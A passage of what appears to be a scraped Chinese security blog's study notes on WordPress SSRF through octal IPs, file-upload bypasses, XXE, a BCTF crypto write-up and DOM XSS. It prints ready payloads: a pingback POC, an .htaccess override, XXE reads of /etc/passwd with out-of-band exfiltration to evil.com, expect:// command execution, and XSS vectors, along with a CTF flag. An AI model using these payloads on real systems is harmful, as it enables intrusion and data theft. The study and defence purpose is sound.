整数型：将上述的二进制直接转换成整数3232235778，浏览器通过访问http://3232235778 解析为192.168.1.2，除此之外还可以通过公式192*256^3+168*256^2+1*256+2=3232235778换算 八进制型：将IP 192.168.1.2换成8进制0300.0250.01.02，在前面加上0表示8进制 十六进制型：将IP 192.168.1.2换成16进制0xc0.0xA8.1.2，在前面加上0x表示16进制 混合型：即以上的几种方式的结合，0300.0xA8.1.0x02 下面就是通过八进制绕过检测。 代码详情漏洞成因处508 wp_http_validate_url 函数1234567891011121314151617......if ( ! $same_host ) &#123; $host = trim( $parsed_url['host'], '.' ); if ( preg_match( '#^\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;$#', $host ) ) &#123; $ip = $host; &#125; else &#123; $ip = gethostbyname( $host ); if ( $ip === $host ) // Error condition for gethostbyname() $ip = false; &#125; if ( $ip ) &#123; $parts = array_map( 'intval', explode( '.', $ip ) ); if ( 127 === $parts[0] || 10 === $parts[0] || 0 === $parts[0] || ( 172 === $parts[0] &amp;&amp; 16 &lt;= $parts[1] &amp;&amp; 31 &gt;= $parts[1] ) || ( 192 === $parts[0] &amp;&amp; 168 === $parts[1] ) ) &#123; ...... 这里的代码通过正则表达式^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$判断ip是否合法，如果不合法则通过网络获取ip的值。下面的if判断则是用来防止给的url为内网ip，但是上述的正则表达式可以通过8进制绕过内网限制。123456if ( empty( $parsed_url['port'] ) ) return $url; $port = $parsed_url['port']; if ( 80 === $port || 443 === $port || 8080 === $port ) return $url; 再接下来可以看到程序又对端口做了限制，只能扫描80,443,8080端口。综上所述，通过8进制绕过ip判断，可以扫描内网的80,443,8080找一下调用的位置,可以找到class-wp-xmlrpc-server.php通过wp_safe_remote_get调用了get函数，get函数使用了wp_http_validate_url，从而造成ssrf 利用利用的方式为通过xmlrpc.php中pingback.ping功能来调用这个函数。POC123456789101112131415161718POST /cms/wordpress/wp442/xmlrpc.php HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 321&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://012.10.10.111:8080/testvul&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://localhost/cms/wordpress/wp442/2016/08/19/hello-world/&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt; 这里设置10.10.10.111为受害者 总结在测试中发现只能对10.x.x.x的内网ip进行利用，因为正则的原因至多只能有3位数字，一位需要为0来表示8进制，所以利用只有10,并且只能扫描80,443,8080端口。由于利用中不回显，也很难确定是否成功利用。所以这个洞可能危害比较小（太菜了，想不到其他的利用方式，有其他的利用方式记得分享啊！！！）还有一种利用就是开启xmlrpc的wordpress站可以被通过pingback.ping方法来DDOS，这个以前就有人提出来了。 参考http://xlab.baidu.com/wordpress/https://virusdefender.net/index.php/archives/733/"},{"title":"【VULNERABLITY】文件上传学习总结","permalink":"http://blog.0kami.cn/2016/07/04/old-old-file-upload/","text":"概述这几天空下来根据上传攻击框架学习总结一下上传攻击。 上传检测流程 客户端javascript检测（检测文件扩展名为主） 服务端MIME类型检测（检测Content-type内容） 服务端目录路劲检测（检测跟path相关的内容） 服务端文件扩展名检测（检测跟文件后缀相关的内容） 服务端文件内容检测（检测内容是否合法或含有恶意代码） 客户端javascript检测通常此类检测会在js文件中有一个检测的函数，一般对上传的文件后缀名做检测，例如仅允许上传png,jpg,gif等类型的文件，如果检测到的文件后缀名不是在这些名单内，则不向服务器端传输文件内容。这类检测也是最容易绕过的检测，可以使用firebug之类的插件把它禁掉或者通过burp之类的代理工具进行绕过提交。使用burp，上传时提供一个白名单内的后缀，通过burp拦包，并修改后缀后提交 服务端检测绕过（MIME类型检测）12345678910111213&lt;?php if($_FILES['userfile']['type'] != \"image/gif\") &#123; //检测Content-type echo \"Sorry, we only allow uploading GIF images\"; exit; &#125; $uploaddir = 'uploads/'; $uploadfile = $uploaddir . basename($_FILES['userfile']['name']); if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) &#123; echo \"File is valid, and was successfully uploaded.\\n\"; &#125; else &#123; echo \"File uploading failed.\\n\"; &#125;?&gt; 上面为php后端检测MIME类型的一个例子通过判断$_FILES[&#39;userfile&#39;][&#39;type&#39;] != &quot;image/gif&quot;来保证上传的类型为gif类型的文件。绕过这一类型的检测，可以通过burp拦包，将原Content-Type类型该为符合要求的image/gif类型。 服务端检测绕过（目录路劲检测）有一些web应用程序有多个文件夹用来存储图片文件，所以为了标识上传的图片是属于哪个文件夹的，上传文件时会带上文件存储路劲。而此时如果对文件目录路劲检测不够完全，可以通过截断攻击。（如%00,windows下%80-%90）如上传时提供存储路劲为image/20160704/可以通过修改为image/20160704/evil.php%00来达到截断目的。后端程序会将该路劲连接为image/20160704/evil.php%00filename.gif00截断导致最终存储的文件名为evil.php 服务器端检测绕过（文件扩展名检测） 黑名单检测黑名单检测通常会有一个文件后缀名黑名单（例如html|htm|php|php2|php3|php4|php5…）但是通常黑名单检测不能包含所有的恶意脚本后缀，防护难度会比较大，推荐使用白名单绕过的方法： 文件名大小写绕过（例如用Php，Asp等） 名单列表绕过(用黑名单中未提及的文件后缀来绕过，如asa，cer等不常见的文件后缀) 0x00截断（asp下可以尝试使用,asp为从后往前扫描扩展名，evil.asp%00.jpg，会被识别为jpg，只要检测方式如这种可以通过这种方式绕过） 特殊文件名绕过（只适用windows，将文件名改为evil.php.或evil.php (注意这里有一个空格),在windows下，不允许这样的命名，所以会将.和空格自动去掉） .htaccess文件攻击（配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测） .htaccess文件攻击如果黑名单中未包含.htaccess后缀的可以通过重写解析配置来达到解析的效果针对php，上传自定义.htaccess123&lt;FilesMatch &quot;haha&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 同目录有个我们上传一个只有文件名并包含字符串”haha”，但是却无任何扩展名的文件里面的内容是 php 一句话木马，通过菜刀连接可以解析php成因： 在 PHP manual 中提到了下面一段话 move_uploaded_file section, there is a warning which states ‘If the destination file already exists, it will be overwritten.’ 如果 PHP 安全没配置好 就可以通过 move_uploaded_file 函数把自己写的.htaccess 文件覆盖掉服务器上的 这样就能任意定义解析名单了 解析漏洞（apache解析漏洞，iis6.0解析漏洞，nginx解析漏洞） apache解析漏洞apache是从右到左开始判断解析，如果最右的后缀无法解析，则尝试解析后一个后缀 iis6.0解析漏洞 成因为iis6.0不解析;后面的，所以提交evil.asp;.html解析为asp类型 还有一个为IIS6.0的00截断攻击 IIS6.0双文件上传 文件夹的名字包含.asp则这个文件夹下的文件都以asp的形式来解析 iis7.0/7.5解析漏洞对于php有一个类似Nginx的解析漏洞evil.jpg/evil.php 解析evil.jpg中的php代码，这个漏洞成因在于php-cgi的漏洞 nginx解析漏洞 将php文件换成其他可以通过的文件后缀，访问的时候在后面加上/.php，即evil.jpg/.php，evil.jpg会解析为php的格式 %00截断 其他方式提交前将filename=”evil.php”该为”evil.php”.jpg” 白名单检测 0x00截断绕过 解析漏洞绕过（文件名不被重写） 服务器端检测绕过（文件内容检测）图像类的文件内容检测 文件幻数检测（图片头格式检测）jpg内容头value= FF D8 FF E0 00 10 4A 46 49 46gif内容头value= 47 49 46 38 39 61png内容头value= 89 50 4E 47 在文件头后加上一句话木马就能绕过 文件相关信息检测 图像文件相关信息检测常用的就是php的getimagesize()函数，可以通过修改图片的注释区（data区）插入一句话代码，如下：1234GIF89a(...some binary data for image...)&lt;?php phpinfo(); ?&gt;(... skipping the rest of binary data ...) 文件加载检测 调用API或函数去进行文件加载测试，常见的是图像渲染测试，二次渲染，可以通过上传恶意文件，再下载下来，diff一下找到不变的位置插入一句话木马，但成功率不高 总结轻量级检测绕过攻击 绕过 javascript 对扩展名的检测 &lt;用 burp 之类的反向代理工具直接 POST 数据包到服务端，绕过前端检测&gt; 绕过服务端对 http request 包 MIME 类型检测 &lt;用 burp 之类的反向代理工具伪造 POST 数据包到服务端，绕过 MIME 检测&gt; 路径/扩展名检测绕过攻击 黑名单绕过 文件名大小写绕过 名单列表绕过 特殊文件名绕过 0x00 截断绕过 .htaccess 文件攻击 本地包含漏洞 Apache 解析漏洞 IIS 解析漏洞 Nginx 解析漏洞 白名单绕过 0x00 截断绕过 本地文件包含漏洞 IIS 解析漏洞 Nginx 解析漏洞 文件内容检测绕过攻击 文件加载测试绕过&lt;对文件进行代码注入再配合任意解析调用/漏洞&gt;"},{"title":"【VULNERABLITY】XML External Entity(XXE)","permalink":"http://blog.0kami.cn/2016/06/28/old-old-xxe/","text":"描述XML的一些基础知识，摘自security.tencent.comXML例子1234567891011121314&lt;?xml version=\"1.0\" ?&gt; xml声明&lt;!DOCTYPE note[ 文档类型定义 &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt;]&gt;&lt;note&gt; 文档元素&lt;to&gt;George&lt;/to&gt;&lt;from&gt;John&lt;/from&gt;&lt;heading&gt;Test&lt;/heading&gt;&lt;body&gt;This is a Test&lt;/body&gt;&lt;/note&gt; 上述为一个XML的实例DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。 内部声明DTD&lt;!DOCTYPE 根元素 [元素声明]&gt; 引用外部DTD&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;或者&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。 内部声明实体&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt; 引用外部实体&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;或者&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt; 漏洞描述摘自OWASP1An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts. 漏洞成因为XML解析器配置不安全时，当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。 试验恶意引入外部实体方式： 本地文件读取 12345&lt;?xml version=\"1.0\" ?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY b SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt; 远程文件读取 12345678&lt;?xml version=\"1.0\" ?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY % d SYSTEM \"http://evil.com/evil.dtd\"&gt; %d;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;其中evil.dtd文件内容&lt;!ENTITY b SYSTEM \"file:///etc/passwd\"&gt; 但是如果遇到读取多行的文件，可能会读不出来，这里可以看一下ftp接受xxe数据不同的语言默认支持的协议不同 libxml2 php java .net filehttpftp filehttpftpphpcompress.zipcompress.bzip2dataglobphar httphttpsftpfilejarnetdocmailtogopher * httpfilehttpsftp 上述为默认支持协议，还可以通过扩展支持其他协议，如php scheme extension required httpsftps openssl zip zip ssh2.shellssh2.execssh2.tunnelssh2.sftpssh2.scp ssh2 rar rar ogg oggvorbis expect expect demo1 任意读取本地文件123456789$xml=&lt;&lt;&lt;EOF&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY b SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;EOF;$data=simplexml_load_string($xml);echo $data; demo2 不回显读取内容，远程传递数据1234567891011121314$xml=&lt;&lt;&lt;EOF&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/issue\"&gt; &lt;!ENTITY % dtd SYSTEM \"http://ip/evil.dtd\"&gt; %dtd; %send;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;EOF;$data=simplexml_load_string($xml);远程DTD文件内容&lt;!ENTITY % all \"&lt;!ENTITY &amp;#x25 send SYSTEM 'http://ip/?xml=%file;'&gt;\"&gt;%all; demo3 执行系统命令123456789$xml=&lt;&lt;&lt;EOF&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY b SYSTEM \"expect://id\"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;EOF;$data=simplexml_load_string($xml);echo $data; 执行成功需要php的expect扩展 demo4 探测内网应用123456789$xml=&lt;&lt;&lt;EOF&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY b SYSTEM \"http://192.168.1.20:80\"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;EOF;$data=simplexml_load_string($xml);echo $data; 如果不存在该ip的应用，会有warning failed to open stream，通过这种方式探测内容应用同时如果找到了内容应用，可以通过这种方式攻击内网应用 防御方案一、使用开发语言提供的禁用外部实体的方法 PHP：libxml_disable_entity_loader(true); JAVA:DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); Python：from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 方案二、过滤用户提交的XML数据关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。 json节点的Content-Type XXE攻击如今很多web应用程序使用的都是json格式的数据传递，通过在http request头中带入Content-Type: application/json表明传递的是json格式的数据。但是有时候服务器可以接受开发人员没有意料到的其他数据格式，如xml格式。如果服务器可以接受xml格式的数据，那么就有可能存在xxe。1234567891011121314151617HTTP Request:POST /netspi HTTP/1.1Host: someserver.netspi.comAccept: application/jsonContent-Type: application/jsonContent-Length: 38&#123;&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;&#125;HTTP Response:HTTP/1.1 200 OKContent-Type: application/jsonContent-Length: 43&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125; 将如上的Content-Type改为xml格式的再发送123456789101112131415161718192021HTTP Request:POST /netspi HTTP/1.1Host: someserver.netspi.comAccept: application/jsonContent-Type: application/xmlContent-Length: 112&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;root&gt;&lt;search&gt;name&lt;/search&gt;&lt;value&gt;netspitest&lt;/value&gt;&lt;/root&gt;HTTP Response:HTTP/1.1 200 OKContent-Type: application/jsonContent-Length: 43&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125; 如果返回的数据是一样的，那么就说明服务器可以接受xml格式的数据，那么我们就可以利用xxe来攻击1234567891011121314151617181920212223242526HTTP Request:POST /netspi HTTP/1.1Host: someserver.netspi.comAccept: application/jsonContent-Type: application/xmlContent-Length: 288&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;root&gt;&lt;search&gt;name&lt;/search&gt;&lt;value&gt;&amp;xxe;&lt;/value&gt;&lt;/root&gt;HTTP Response:HTTP/1.1 200 OKContent-Type: application/jsonContent-Length: 2467&#123;&quot;error&quot;: &quot;no results for name root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/sync.... 但是并不是所有的json节点都是接受xml格式的数据的。有可能返回解析错误的提示或者415不支持媒体类型的错误消息 带上一个xxe-cheat-sheet，DTD-Attacks参考security.tencent.com，91ri.org"},{"title":"【CTF】BCTF Crypto SpecialRSA writeup","permalink":"http://blog.0kami.cn/2016/03/20/old-old-CTF-BCTF-Crypto-SpecialRSA-writeup/","text":"题目描述将附带的zip文件下载并解压。可以看到以下几个文件： 加密算法 示例密文 示例明文 加密的flag文件大致我们可以看出来，题目的意图为通过示例密明文，算出加密秘钥k，然后通过k解密flag文件。阅读加解密算法，我们可以得出以下的数学公式：12345gcd(k,N)=1,kd+Ny=1,c=&gt;criphertext,m=&gt;plaintext encode c=[(k^r%N)*m]%N decode m=[(d^r%N)*c]%N 已知2组(m,r,c) N 的值 求解k 到这里卡了很久，一直没个正确的方式来获取k，不用数学就会忘记啊啊啊啊啊啊啊。后来求组了老师，得到了一个思路。12345678910下面所有^-1表示对应的乘法逆元 假设gcd(r1,r2)=1,那么存在a,b使得公式r1*a+r2*b=1 那么 k^1 =k^(r1*a+r2*b) =k^(r1*a) * k^(r2*b) =(k^r1)^a * (k^r2)^b而k^rn 可以通过(m,r,c)对来获得这里直接使用encode公式c=[(k^r%N)*m]%N通过推导可以得出k^r=c*(m^-1)m的逆元可以通过扩展欧几里德算法来求得 有了上面的思路，就可以写程序来加解密了，这里我用了python来写，其中(m,r,c)对我事先拿出来了，清楚一点,下面的程序是来算k的123456789101112131415161718192021222324252627282930313233343536373839404142434445import msgpackfrom Crypto.PublicKey import RSAN = 23927411014020695772934916764953661641310148480977056645255098192491740356525240675906285700516357578929940114553700976167969964364149615226568689224228028461686617293534115788779955597877965044570493457567420874741357186596425753667455266870402154552439899664446413632716747644854897551940777512522044907132864905644212655387223302410896871080751768224091760934209917984213585513510597619708797688705876805464880105797829380326559399723048092175492203894468752718008631464599810632513162129223356467602508095356584405555329096159917957389834381018137378015593755767450675441331998683799788355179363368220408879117131Ldef Ext_Euclid (a , b ): ''' 扩展欧几里得算法 a*x + b*y = gcd(a,b) 返回 x,y以及a，b的最大公约数gcd :param a: :param b: :return:x,y以及a，b的最大公约数gcd ''' if (b == 0): return 1 , 0 , a else: x , y , q=Ext_Euclid( b , a % b ) x , y = y,( x - (a // b) * y ) return x , y , qm1=8246074182642091125578311828374843698994233243811347691229334829218700728624047916518503687366611595562099039411430662968666847086659721231623198995017758424796091810259884653332576136128144958751327844746991264667007359518181363522934430676655236880489550093852524801304612322373542296281962196795304499711006801211783005857297362930338978872451934860435597545642219213551685973208209873623909629278321181485010964460652298690058747090298312365230671723790850998541956664376820820570709272500330966205578898690396706695024001970727864091436518202414166919020415892764617055978488996164642229582717493375419993187360Lc1=14548997380897265239778884825381301109965518989661808090688952232381091726761464959572943383024428028270717629953894592890859128818839328499002950828491521254480795364789013196240119403187073307558598496713832435709741997056117831860370227155633169019665564392649528306986826960829410120348913586592199732730933259880469229724149887380005627321752843489564984358708013300524640545437703771424168108213045567568595093421366224818609501318783680497763353618110184078118456368631056649526433730408976988014678391205055298782061128568056163894010397245301425676232126267874656710256838457728944370612289985071385621160886Lm11=RSA.inverse(m1,N)# 求逆元kr1=m11*c1m2=15575051453858521753108462063723750986386093067763948316612157946190835527332641201837062951012227815568418309166473080588354562426066694924364886916408150576082667797274000661726279871971377438362829402529682825471299861814829463510659258586020732228351258291527965822977048954720558973840956731377322516168809373640494227129998871167089589689796024458501705704779109152762373660542684880052489213039920383757930855300338529058000330103359636123251274293258Lc2=12793942795110038319724531875568693507469327176085954164034728727511164833335101755153514030256152878364664079056565385331901196541015393609751624971554016671160730478932343949538202167508319292084519621768851878526657022981883304260886841513342396524869530063372782511380879783246034751883691295368172069170967975561364277514063320691930900258017293871754252209727301719207692321798229276732198521711602080244950295889575423383308099786298184477668302842952215665734671829249323604032320696267130330613134368640401070775927197554082071807605399448960911234829590548855031180158567578928333030631307816223152118126597Lm21=RSA.inverse(m2,N)kr2=m21*c2# print kr2r1=12900676191620430360427117641859547516838813596331616166760756921115466932766990479475373384324634210232168544745677888398849094363202992662466063289599443Lr2=7718975159402389617924543100113967512280131630286624078102368166185443466262861344357647019797762407935675150925250503475336639811981984126529557679881059La,b,_=Ext_Euclid(r1,r2)print aprint b# print a*r1+b*r2x1=RSA.inverse(kr2,N)k=(pow(kr1, a,N)*pow(x1,-b,N))%Nprint k 通过上面的程序可以算出 k=175971776542095822590595405274258668271271366360140578776612582276966567082080372980811310146217399585938214712928761559525614866113821551467842221588432676885027725038849513527080849158072296957428701767142294778752742980766436072183367444762212399986777124093501619273513421803177347181063254421492621011961L 接下来就简单了将k带入官方的算法就可以得到flag.BCTF{q0000000000b3333333333-ju57-w0n-pwn20wn!!!!!!!!!!!!}上面程序中需要注意的是pow函数不支持指数为负数的情况，所以还要再转一下弯。 1234a&gt;0,b&lt;0(k^r)^b=(k^-r)^-b所以可以先求出k^r mod N的逆元 总结数学方面的知识还是短板啊，以后得加强一下:)"},{"title":"【VULNERABLITY】DOM XSS","permalink":"http://blog.0kami.cn/2016/03/17/old-old-DOM-XSS/","text":"引言 这几天阅读了《Web前端黑客技术揭秘》 ，对DOM型的XSS进行一个总结，内容主要为书中提到的知识点，整理整理作以后复习所用。 DOM类型的XSS与反射型、存储型XSS都不同，DOM型XSS不用服务器端解析响应的参与，触发DOM型XSS可以说主要依靠浏览器客户端的解析。常见的输出点见0x04附录。 DOM渲染 首先我们来理解一下HTML与Javascript自解码机制，查看以下三个例子123456789101112131. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;)&quot; /&gt;2. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(HtmlEncode(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;))&quot; /&gt;&lt;script&gt; function HtmlEncode(str) &#123; var s=&quot;&quot;; if(str.length==0) return &quot;&quot;; s=str.replace(/&amp;/g, &quot;&amp;amp;&quot;); s=str.replace(/&lt;/g, &quot;&amp;lt;&quot;); s=str.replace(/&gt;/g, &quot;&amp;gt;&quot;); s=str.replace(/\\&quot;/g, &quot;&amp;quot;&quot;); return s; &#125;3. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(&apos;&amp;lt;img src=@ onerror=alert(123) /&amp;gt;&apos;)&quot; /&gt; 对于第一种情况，很清楚，点击这个按钮后，会将&lt;img src=@ onerror=alert(123) /&gt;写入DOM中，并触发alert(123)。而第二种与第三种，document.write的内容都变成了&amp;lt;img src=@ onerror=alert(123) /&amp;gt;，区别在于一个是在HTML标签中,一个是通过Javascript处理后才变成这个样子的，那么这2种情况都会触发弹窗吗？答案是第二种不会，而第三种会触发。 形成这样的原因就是因为HTML与Javascript自解码机制，在HTML标签中的javascript可以进行HTML形式的编码。在HTML标签中的javascript代码会先被HTML形式的编码进行解码，即第三种情况中&amp;lt;img src=@ onerror=alert(123) /&amp;gt;在javascript运行前已经解码为&lt;img src=@ onerror=alert(123) /&gt;，而第二种情况为javascript运行中进行的HTML形式的编码，所以写到DOM中时直接显示在页面上。HTML中的编码： 进制编码：&#xH;(十六进制格式)、&#D;(十进制格式),最后的分号可以不要 HTML实体编码：即上面的那个HtmlEncode 那么同样的，在javascript上下文环境中，将内容改为javascript的编码，同样会自解码，我们来看下一个例子12345678&lt;input type=&quot;button&quot; id=&quot;exec_btn&quot; value=&quot;exec&quot; /&gt;&lt;script&gt; function $(id)&#123;return document.getElementById(id);&#125;; $(&apos;exec_btn&apos;).onclick=function()&#123; document.write(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;); document.write(&apos;\\u003c\\u0069\\u006d\\u0067\\u0020\\u0073\\u0072\\u0063\\u003d\\u0040\\u0020\\u006f\\u006e\\u0065\\u0072\\u0072\\u006f\\u0072\\u003d\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0032\\u0033\\u0029\\u0020\\u002f\\u003e&apos;); &#125; 上面2中write出现的结果是相同的，同样的道理，由于上述编码为javascript的编码形式，并且在javascript的上下文环境中，会先进行解码，再运行javascript。JavaScript中的编码： Unicode形式：\\uH 普通十六进制：\\xH 纯转义：\\’、\\”、\\&lt;、>这样在特殊字符前加\\进行转义 通过上面几个例子，我们可以知道在HTML中与在Javascript中自动解码的差异，如果防御没有区分这样的场景，就会出现问题。 理解了上述的自解码机制，在不同的标签下会有不同的结果，比如一下几个标签会自带HtmlEncode功能12345678&lt;title&gt;&lt;/title&gt;&lt;iframe&gt;&lt;/iframe&gt;&lt;noscript&gt;&lt;/noscript&gt;&lt;noframes&gt;&lt;/noframes&gt;&lt;textarea&gt;&lt;/textarea&gt;&lt;xmp&gt;&lt;/xmp&gt;&lt;plaintext&gt;&lt;/plaintext&gt; &lt;xmp&gt;没有HtmlEncode功能，&lt;plaintext&gt;在Firefox下会进行HtmlEncode编码，在chrome下不会。 DOM fuzzing 直接看代码把 下面的程序用python编写123456789101112131415161718192021222324252627282930313233def get_template(template_file): &quot;&quot;&quot;获取fuzzing的模板文件内容&quot;&quot;&quot; content=&apos;&apos; with open(template_file) as f: content=f.read() return contentdef set_result(result_file,result): &quot;&quot;&quot;生成fuzzing结果文件&quot;&quot;&quot; with open(result_file,&apos;w&apos;) as f: f.write(result)def fuzzing(fuzz_file,result_file): template=get_template(fuzz_file) fuzz_area_0=template.find(&apos;&lt;fuzz&gt;&apos;) fuzz_area_1=template.find(&apos;&lt;/fuzz&gt;&apos;) fuzz_area=template[fuzz_area_0+6:fuzz_area_1].strip() # chars=[] chars=[] for i in xrange(255): # ASCII玛转换为字符 if i!=62: chars.append(chr(i)) fuzz_area_result=&apos;&apos; for c in chars: #遍历这些字符 逐一生成fuzzing内容 fuzz_area_r=fuzz_area.replace(&apos;&#123;&#123;char&#125;&#125;&apos;,c) fuzz_area_r=fuzz_area_r.replace(&apos;&#123;&#123;id&#125;&#125;&apos;,str(ord(c))) fuzz_area_result+=fuzz_area_r+&apos;\\n&apos; print fuzz_area_r result=template.replace(fuzz_area,fuzz_area_result) set_result(result_file,result)if __name__==&apos;__main__&apos;: fuzzing(&quot;fuzz_xss_0.html&quot;,&quot;res.html&quot;) 下面为fuzz_xss_0.html的内容12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Fuzz xss 0&lt;/title&gt; &lt;script&gt; function $(x)&#123;return document.getElementById(x);&#125; function f(id)&#123; $(&apos;result&apos;).innerHTML+=id+&apos;&lt;br/&gt;&apos;; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h3&gt;Fuzzing Result:&lt;/h3&gt;&lt;code&gt; &#123;&#123;id&#125;&#125;: &lt;&#123;&#123;char&#125;&#125;script&gt;f(&quot;&#123;&#123;id&#125;&#125;&quot;)&lt;/script&gt;&lt;/code&gt;&lt;div id=&quot;result&quot;&gt;&lt;/div&gt;&lt;br/&gt;&lt;h3&gt;Fuzzing...&lt;/h3&gt;&lt;fuzz&gt; &#123;&#123;id&#125;&#125;: &lt;&#123;&#123;char&#125;&#125;script&gt;f(&quot;&#123;&#123;id&#125;&#125;&quot;)&lt;/script&gt;&lt;br/&gt;&lt;/fuzz&gt;&lt;/body&gt;&lt;/html&gt; 通过上面的fuzzing技巧，可以自行扩展 DOM XSS 挖掘 静态方法 静态方法查找危险关键字，可以使用下列正则表达式来匹配。123456789101112131415Finding SourcesThe following regular expression attempts to match most common DOMXSS sources (BETA):/(location\\s*[\\[.])|([.\\[]\\s*[&quot;&apos;]?\\s*(arguments|dialogArguments|innerHTML|write(ln)?|open(Dialog)?|showModalDialog|cookie|URL|documentURI|baseURI|referrer|name|opener|parent|top|content|self|frames)\\W)|(localStorage|sessionStorage|Database)/Finding SinksThe following regular expression attempts to match most common DOMXSS sinks (BETA):/((src|href|data|location|code|value|action)\\s*[&quot;&apos;\\]]*\\s*\\+?\\s*=)|((replace|assign|navigate|getResponseHeader|open(Dialog)?|showModalDialog|eval|evaluate|execCommand|execScript|setTimeout|setInterval)\\s*[&quot;&apos;\\]]*\\s*\\()/This regular expression finds sinks based on jQuery, it also finds the $ function, which is not always insecure:/after\\(|\\.append\\(|\\.before\\(|\\.html\\(|\\.prepend\\(|\\.replaceWith\\(|\\.wrap\\(|\\.wrapAll\\(|\\$\\(|\\.globalEval\\(|\\.add\\(|jQUery\\(|\\$\\(|\\.parseHTML\\(/ 详情可以看https://code.google.com/archive/p/domxsswiki/wikis/FindingDOMXSS.wiki一旦发现页面存在可疑特征，就进行人工分析，这是静态方法的代价，对人工参与要求很高 动态方法 动态方法相当于一次Javascript源码动态审计的过程。书中提到了两种思路123&lt;script&gt;eval(location.hash.substr(1));&lt;/script&gt; 就拿上面的例子来说，如何检测上面的DOM XSS 思路一 借用浏览器自身的动态性，可以写Firefox插件，批量对目标地址发起请求（一个模糊测试的过程），请求的形式为：在目标地址后加上#fuzzing内容，就当前这个例子来说。比如当前fuzzing内容为：var x=&#39;d0mx55&#39; 并且对常见的输出点函数进行劫持，如123456var _eval=eval;eval=function(x)&#123; if(typeof(x)==&apos;undefined&apos;)&#123;return;&#125; if(x.indexOf(&apos;d0mx55&apos;)!=-1)&#123;alert(&apos;found dom xss&apos;); _eval(x);&#125;; 